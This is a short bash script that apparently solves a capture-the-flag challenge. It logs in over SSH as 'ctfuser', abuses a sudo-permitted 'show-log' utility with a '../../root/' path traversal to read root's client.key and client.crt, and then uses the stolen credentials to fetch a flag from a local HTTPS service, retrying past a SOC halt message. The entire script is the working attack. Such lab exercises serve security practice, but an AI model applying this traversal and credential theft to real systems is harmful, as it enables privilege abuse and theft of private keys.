#!/bin/bash

set -u

HALT_MESSAGE='Halting request, pending soc investigation'

ssh -o "StrictHostKeyChecking no" ctfuser@localhost 'sudo /usr/local/sbin/show-log ../../root/client.key' > client.key
ssh -o "StrictHostKeyChecking no" ctfuser@localhost 'sudo /usr/local/sbin/show-log ../../root/client.crt' > client.crt

while true; do
  response="$(curl -sk --cert client.crt --key client.key https://localhost:8443/flag)"
  printf '%s\n' "$response"

  if ! grep -Fq "$HALT_MESSAGE" <<<"$response"; then
    exit 0
  fi

  sleep 1
done
